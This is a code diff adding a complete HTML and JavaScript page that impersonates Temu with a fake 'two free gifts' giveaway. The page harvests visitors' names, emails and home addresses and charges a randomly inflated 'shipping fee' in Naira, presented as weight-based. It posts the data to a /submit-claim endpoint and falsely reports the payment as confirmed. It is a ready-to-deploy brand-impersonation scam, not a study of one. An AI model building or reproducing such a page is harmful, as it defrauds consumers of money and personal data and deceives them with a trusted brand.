@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temu Celebration Giveaway - Confirm Shipping</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Configure Tailwind theme for a festive and professional look -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'temu-orange': '#FF6700',
+                        'temu-dark': '#1A1A1A',
+                        'temu-light': '#F8F8F8',
+                        'temu-accent': '#FFD700', 
+                        'temu-red': '#E53E3E', 
+                        'temu-green': '#38A169', 
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    boxShadow: {
+                        'glow': '0 0 15px rgba(255, 103, 0, 0.5)',
+                        'badge-glow': '0 0 8px rgba(255, 215, 0, 0.7)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Custom styles for professional appearance */
+        .item-card {
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: 3px solid transparent;
+            position: relative; 
+        }
+        .item-card.selected {
+            border-color: #FFD700; 
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+            transform: scale(1.05);
+        }
+        .item-card:not(.selected):hover {
+            box-shadow: 0 0 10px rgba(255, 103, 0, 0.5);
+            transform: scale(1.02);
+        }
+        .free-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #E53E3E; 
+            color: white;
+            padding: 4px 10px;
+            border-radius: 9999px;
+            font-weight: bold;
+            font-size: 0.875rem; 
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            z-index: 5;
+            transform: rotate(5deg);
+        }
+    </style>
+</head>
+<body class="bg-temu-dark text-temu-light min-h-screen font-sans">
+
+    <!-- Header -->
+    <header class="bg-temu-orange py-4 shadow-lg sticky top-0 z-10">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center">
+            <h1 class="text-3xl font-extrabold text-white tracking-tight">
+                <span class="text-temu-accent">T</span>emu Gift Season
+            </h1>
+            <div id="selection-status" class="text-lg font-semibold bg-white text-temu-dark px-4 py-2 rounded-full shadow-md transition-all duration-300">
+                Step 1 of 2
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+        
+        <!-- ========================================================= -->
+        <!-- STEP 1: ITEM SELECTION & ADDRESS -->
+        <!-- ========================================================= -->
+        <div id="step-1-selection">
+            <div class="text-center mb-10">
+                <h2 class="text-5xl font-bold mb-3 text-temu-light">Pick Your Two FREE Gifts!</h2>
+                <p class="text-xl text-gray-300">
+                    Select **exactly two (2) items** below to proceed to shipping confirmation.
+                </p>
+            </div>
+
+            <!-- Product Grid -->
+            <div id="product-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
+                
+                <!-- Item 1: Smart Watch -->
+                <div id="item-1" data-name="Pro Smartwatch" data-weight="heavy" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/smartwatch.png -->
+                    <img src="images/smartwatch.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Smart+Watch'" alt="Smart Watch" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">Pro Smartwatch</h3>
+                    <p class="text-gray-400 text-sm">Track fitness and calls easily.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$99.99</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+
+                <!-- Item 2: Bluetooth Speaker -->
+                <div id="item-2" data-name="Portable Bluetooth Speaker" data-weight="medium" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/speaker.png -->
+                    <img src="images/speaker.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Bluetooth+Speaker'" alt="Bluetooth Speaker" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">Portable Bluetooth Speaker</h3>
+                    <p class="text-gray-400 text-sm">High-fidelity sound on the go.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$49.99</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+
+                <!-- Item 3: Wireless Earbuds -->
+                <div id="item-3" data-name="Luxury Wireless Earbuds" data-weight="light" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/earbuds.png -->
+                    <img src="images/earbuds.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Wireless+Earbuds'" alt="Wireless Earbuds" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">Luxury Wireless Earbuds</h3>
+                    <p class="text-gray-400 text-sm">Crystal clear audio and mic.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$79.99</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+
+                <!-- Item 4: Home Security Camera -->
+                <div id="item-4" data-name="1080p Security Camera" data-weight="medium" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/camera.png -->
+                    <img src="images/camera.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Security+Camera'" alt="Home Security Camera" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">1080p Security Camera</h3>
+                    <p class="text-gray-400 text-sm">Keep your home safe 24/7.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$65.00</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+                
+                <!-- Item 5: Gaming Mouse -->
+                <div id="item-5" data-name="Ergonomic Gaming Mouse" data-weight="light" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/mouse.png -->
+                    <img src="images/mouse.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Gaming+Mouse'" alt="Gaming Mouse" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">Ergonomic Gaming Mouse</h3>
+                    <p class="text-gray-400 text-sm">Precision and speed for pro gamers.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$35.99</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+
+                <!-- Item 6: Portable Mini Blender -->
+                <div id="item-6" data-name="Portable Mini Blender" data-weight="medium" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/blender.png -->
+                    <img src="images/blender.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Mini+Blender'" alt="Mini Blender" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">Portable Mini Blender</h3>
+                    <p class="text-gray-400 text-sm">Fresh smoothies anywhere.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$40.00</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+
+                <!-- Item 7: Power Bank -->
+                <div id="item-7" data-name="20000mAh Power Bank" data-weight="light" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/powerbank.png -->
+                    <img src="images/powerbank.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Power+Bank'" alt="Power Bank" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">20000mAh Power Bank</h3>
+                    <p class="text-gray-400 text-sm">High-capacity portable charger.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$29.99</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+
+                <!-- Item 8: Electric Neck Massager -->
+                <div id="item-8" data-name="Electric Neck Massager" data-weight="heavy" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
+                    <div class="free-badge">FREE</div>
+                    <!-- LOCAL IMAGE PATH: images/massager.png -->
+                    <img src="images/massager.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Neck+Massager'" alt="Neck Massager" class="w-full h-auto rounded-lg mb-3">
+                    <h3 class="text-xl font-bold text-temu-accent">Electric Neck Massager</h3>
+                    <p class="text-gray-400 text-sm">Relieve stress and tension.</p>
+                    <div class="mt-2 flex justify-center items-center space-x-2">
+                        <span class="text-gray-500 line-through text-md">$55.00</span>
+                        <span class="text-temu-red font-bold text-lg">FREE</span>
+                    </div>
+                </div>
+                
+            </div>
+
+            <!-- Contact/Address Form -->
+            <div class="mt-12 p-8 bg-temu-orange/10 rounded-2xl shadow-xl border border-temu-orange/50">
+                <h3 class="text-3xl font-bold text-temu-light mb-6">Confirm Shipping Information</h3>
+
+                <div id="selected-list" class="mb-6 p-4 bg-temu-dark rounded-lg border border-temu-accent/50">
+                    <p class="text-temu-accent font-semibold">Selected Items: <span id="item-names">None selected.</span></p>
+                    <p id="error-message" class="text-red-400 mt-2 hidden">Please select exactly two items to proceed.</p>
+                </div>
+
+                <form id="contact-form">
+                    <h4 class="text-xl font-semibold text-gray-200 mb-4 border-b border-gray-600 pb-2">Contact Details</h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                        <div>
+                            <label for="name" class="block text-sm font-medium text-gray-300">Full Name</label>
+                            <input type="text" id="name" name="name" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                        </div>
+                        <div>
+                            <label for="email" class="block text-sm font-medium text-gray-300">Email Address</label>
+                            <input type="email" id="email" name="email" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                        </div>
+                    </div>
+
+                    <h4 class="text-xl font-semibold text-gray-200 mb-4 border-b border-gray-600 pb-2">Current Shipping Address</h4>
+                    <div class="grid grid-cols-1 gap-6">
+                        <div>
+                            <label for="address1" class="block text-sm font-medium text-gray-300">Address Line 1</label>
+                            <input type="text" id="address1" name="address1" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                        </div>
+                        <div>
+                            <label for="address2" class="block text-sm font-medium text-gray-300">Address Line 2 (Apt, Suite, etc. - Optional)</label>
+                            <input type="text" id="address2" name="address2" class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                            <div>
+                                <label for="city" class="block text-sm font-medium text-gray-300">City</label>
+                                <input type="text" id="city" name="city" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                            </div>
+                            <div>
+                                <label for="state" class="block text-sm font-medium text-gray-300">State / Province</label>
+                                <input type="text" id="state" name="state" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                            </div>
+                            <div>
+                                <label for="zip" class="block text-sm font-medium text-gray-300">Zip / Postal Code</label>
+                                <input type="text" id="zip" name="zip" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
+                            </div>
+                        </div>
+                    </div>
+
+                    
+                    <button type="submit" id="continue-button" disabled class="mt-8 w-full px-6 py-4 bg-gray-500 text-temu-light font-bold rounded-xl text-xl shadow-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed">
+                        <span id="button-text">Select 2 Items to Continue</span>
+                    </button>
+                </form>
+            </div>
+        </div>
+
+
+        <!-- ========================================================= -->
+        <!-- STEP 2: SHIPPING FEE REVIEW -->
+        <!-- ========================================================= -->
+        <div id="step-2-shipping" class="hidden">
+            <div class="bg-temu-orange/10 p-8 rounded-2xl shadow-xl border border-temu-accent max-w-2xl mx-auto">
+                <h2 class="text-4xl font-bold text-temu-accent mb-4 text-center">Shipping & Handling Confirmation</h2>
+                <p class="text-lg text-gray-300 mb-8 text-center">
+                    Your **<span id="shipping-item-names" class="font-semibold text-temu-light"></span>** are free. Confirm the final shipping fee below to claim them immediately.
+                </p>
+
+                <div class="space-y-4 text-lg">
+                    <div class="flex justify-between border-b border-gray-700 pb-2">
+                        <span>Items Subtotal:</span>
+                        <span class="font-bold text-temu-red line-through">₦200,000.00</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-700 pb-2">
+                        <span>Promotional Discount:</span>
+                        <span class="font-bold text-temu-green">-₦200,000.00</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-700 pb-2">
+                        <span>Estimated Shipping Fee:</span>
+                        <span id="shipping-fee" class="font-bold text-temu-light">--</span>
+                    </div>
+                    <div class="flex justify-between pt-4 border-t-2 border-temu-accent">
+                        <span class="text-2xl font-extrabold">TOTAL DUE:</span>
+                        <span id="total-due" class="text-2xl font-extrabold text-temu-orange">--</span>
+                    </div>
+                </div>
+
+                <p class="text-sm text-gray-400 mt-6 text-center">
+                    (Note: Shipping fees vary based on location and the combined weight of selected items.)
+                </p>
+
+                <button id="pay-now-button" class="mt-8 w-full px-6 py-4 bg-temu-orange text-white font-bold rounded-xl text-xl shadow-lg hover:bg-temu-orange/80 transition-all duration-300">
+                    Proceed to Secure Payment
+                </button>
+                <button id="back-button" class="mt-4 w-full px-6 py-3 bg-gray-700 text-gray-300 font-semibold rounded-xl text-lg hover:bg-gray-600 transition-all duration-300">
+                    &larr; Go Back to Edit Selection
+                </button>
+            </div>
+        </div>
+
+        <!-- Success/Error Message Modal -->
+        <div id="message-box" class="fixed inset-0 bg-black bg-opacity-75 z-20 flex items-center justify-center hidden" role="alert">
+            <div class="bg-temu-dark p-8 rounded-xl max-w-md w-full shadow-glow border border-temu-accent">
+                <h4 id="message-title" class="text-2xl font-bold mb-4 text-temu-accent"></h4>
+                <p id="message-content" class="text-gray-300 mb-6"></p>
+                <button id="close-modal" class="w-full bg-temu-orange hover:bg-temu-orange/80 text-white font-semibold py-3 rounded-lg transition duration-200">
+                    Close
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- JavaScript Logic -->
+    <script>
+        // Global state storage for multi-step form
+        let appState = {
+            maxSelections: 2,
+            selectedItems: [],
+            contactData: {},
+            shippingFee: 0
+        };
+
+        // DOM elements
+        const step1 = document.getElementById('step-1-selection');
+        const step2 = document.getElementById('step-2-shipping');
+        const statusElement = document.getElementById('selection-status');
+        const productGrid = document.getElementById('product-grid');
+        const itemNamesElement = document.getElementById('item-names');
+        const errorElement = document.getElementById('error-message');
+        const continueButton = document.getElementById('continue-button');
+        const buttonText = document.getElementById('button-text');
+        const contactForm = document.getElementById('contact-form');
+        
+        const shippingItemNames = document.getElementById('shipping-item-names');
+        const shippingFeeElement = document.getElementById('shipping-fee');
+        const totalDueElement = document.getElementById('total-due');
+        const payNowButton = document.getElementById('pay-now-button');
+        const backButton = document.getElementById('back-button');
+        
+        const messageBox = document.getElementById('message-box');
+        const messageTitle = document.getElementById('message-title');
+        const messageContent = document.getElementById('message-content');
+        const closeModalButton = document.getElementById('close-modal');
+
+
+        // --- UI & SELECTION LOGIC ---
+
+        // Function to format NGN currency
+        function formatNaira(amount) {
+            // Ensure we format as NGN with 2 decimal places
+            return `₦${amount.toLocaleString('en-NG', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+        }
+
+        // Function to calculate shipping fee (based on item weights)
+        function calculateShippingFee(items) {
+            let baseFee = 15000; // Base fee in Naira
+            let weightFactor = 0;
+
+            items.forEach(item => {
+                switch (item.weight) {
+                    case 'light':
+                        weightFactor += 0.5;
+                        break;
+                    case 'medium':
+                        weightFactor += 1.0;
+                        break;
+                    case 'heavy':
+                        weightFactor += 1.5;
+                        break;
+                }
+            });
+
+            // Calculate fee: base + (weightFactor * random amount between 5000 and 10000)
+            const randomAdd = Math.floor(Math.random() * 5000) + 5000;
+            let calculatedFee = baseFee + (weightFactor * randomAdd);
+
+            // Ensure fee does not exceed ₦45,000
+            const maxFee = 45000;
+            return Math.min(Math.round(calculatedFee), maxFee);
+        }
+
+        // Function to update the UI based on current selections
+        function updateUI() {
+            const currentSelections = appState.selectedItems.length;
+            
+            // Update status counter
+            statusElement.textContent = `Step 1 of 2 (${currentSelections} / ${appState.maxSelections} Items)`;
+
+            // Update selected item names list
+            if (currentSelections > 0) {
+                itemNamesElement.textContent = appState.selectedItems.map(item => item.name).join(', ');
+            } else {
+                itemNamesElement.textContent = 'None selected.';
+            }
+
+            // Check if submission is ready (exactly 2 items selected)
+            const isReady = currentSelections === appState.maxSelections;
+
+            continueButton.disabled = !isReady;
+            continueButton.className = isReady
+                ? 'mt-8 w-full px-6 py-4 bg-temu-orange text-white font-bold rounded-xl text-xl shadow-lg hover:bg-temu-orange/80 transition-all duration-300'
+                : 'mt-8 w-full px-6 py-4 bg-gray-500 text-temu-light font-bold rounded-xl text-xl shadow-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed';
+            
+            buttonText.textContent = isReady
+                ? `Continue to Shipping Confirmation (${currentSelections}/${appState.maxSelections})`
+                : `Select ${appState.maxSelections - currentSelections} More Item${appState.maxSelections - currentSelections === 1 ? '' : 's'}`;
+            
+            // Show error message if too many are selected
+            if (currentSelections > appState.maxSelections) {
+                errorElement.classList.remove('hidden');
+            } else {
+                errorElement.classList.add('hidden');
+            }
+        }
+
+        // Handle item clicks
+        productGrid.addEventListener('click', (e) => {
+            const card = e.target.closest('.item-card');
+            if (!card) return;
+
+            const itemId = card.id;
+            const itemName = card.dataset.name;
+            const itemWeight = card.dataset.weight;
+            const isSelected = card.classList.contains('selected');
+
+            if (isSelected) {
+                // Deselect the item
+                card.classList.remove('selected');
+                appState.selectedItems = appState.selectedItems.filter(item => item.id !== itemId);
+            } else {
+                // Select the item, but check limit first
+                if (appState.selectedItems.length < appState.maxSelections) {
+                    card.classList.add('selected');
+                    appState.selectedItems.push({ id: itemId, name: itemName, weight: itemWeight });
+                } else {
+                    showMessage('Limit Reached!', `You can only pick ${appState.maxSelections} items. Please deselect one item before choosing another.`, false);
+                }
+            }
+            updateUI();
+        });
+
+
+        // --- FORM SUBMISSION & STEP TRANSITION LOGIC (STEP 1) ---
+
+        // Handle step 1 form submission (Continue Button)
+        contactForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            if (appState.selectedItems.length !== appState.maxSelections) {
+                showMessage('Error', `Please ensure exactly ${appState.maxSelections} items are selected.`, false);
+                return;
+            }
+
+            // 1. Capture Form Data
+            appState.contactData = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value,
+                address: {
+                    line1: document.getElementById('address1').value,
+                    line2: document.getElementById('address2').value || '',
+                    city: document.getElementById('city').value,
+                    state: document.getElementById('state').value,
+                    zip: document.getElementById('zip').value
+                }
+            };
+            
+            // 2. Calculate Shipping Fee and store it in state
+            appState.shippingFee = calculateShippingFee(appState.selectedItems);
+            
+            // 3. Update Step 2 UI
+            shippingItemNames.textContent = appState.selectedItems.map(item => item.name).join(' & ');
+            shippingFeeElement.textContent = formatNaira(appState.shippingFee);
+            totalDueElement.textContent = formatNaira(appState.shippingFee);
+
+            // 4. Transition to Step 2
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+            statusElement.textContent = 'Step 2 of 2 (Confirm Payment)';
+        });
+
+
+        // --- FINAL SUBMISSION LOGIC (STEP 2 - CONNECTED TO SERVER) ---
+        payNowButton.addEventListener('click', async () => {
+            payNowButton.disabled = true;
+            payNowButton.textContent = "Sending Claim to Server...";
+
+            const finalData = {
+                items_claimed: appState.selectedItems.map(item => ({ id: item.id, name: item.name })),
+                user_info: appState.contactData,
+                shipping_fee_ngn: appState.shippingFee,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                // The fetch call goes to the server.js endpoint
+                const response = await fetch('/submit-claim', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(finalData)
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    // Success response from server
+                    console.log("Server response:", result.message);
+                    showMessage(
+                        '✅ Claim Submitted!',
+                        `Your claim has been recorded on the server (ID: ${result.claimId || 'N/A'}). Your payment of ${formatNaira(appState.shippingFee)} is confirmed. Thank you!`,
+                        true
+                    );
+                    resetApp();
+                } else {
+                    // Error response from server
+                    console.error("Server error:", result.error);
+                    showMessage('🚫 Claim Failed', `The server rejected the claim: ${result.error || 'Unknown error.'} Please try again.`, false);
+                }
+
+            } catch (error) {
+                console.error("Network or Fetch Error:", error);
+                showMessage('🚫 Network Error', 'Could not connect to the server to submit the claim. Check your connection or deployment.', false);
+            } finally {
+                payNowButton.disabled = false;
+                payNowButton.textContent = "Proceed to Secure Payment";
+            }
+        });
+
+        // Handle back button
+        backButton.addEventListener('click', () => {
+            step2.classList.add('hidden');
+            step1.classList.remove('hidden');
+            statusElement.textContent = 'Step 1 of 2 (Select 2 Items)';
+            updateUI();
+        });
+
+
+        // --- UTILITY FUNCTIONS ---
+
+        function showMessage(title, content, isSuccess) {
+            messageTitle.textContent = title;
+            messageTitle.classList.remove('text-red-400', 'text-temu-accent');
+            messageTitle.classList.add(isSuccess ? 'text-temu-accent' : 'text-temu-red');
+            messageContent.textContent = content;
+            messageBox.classList.remove('hidden');
+        }
+
+        closeModalButton.addEventListener('click', () => {
+            messageBox.classList.add('hidden');
+        });
+        
+        function resetApp() {
+            contactForm.reset();
+            appState.selectedItems = [];
+            document.querySelectorAll('.item-card').forEach(card => card.classList.remove('selected'));
+            step2.classList.add('hidden');
+            step1.classList.remove('hidden');
+            updateUI();
+        }
+
+        // Initial UI setup
+        window.onload = updateUI;
+
+    </script>
+</body>
+</html>
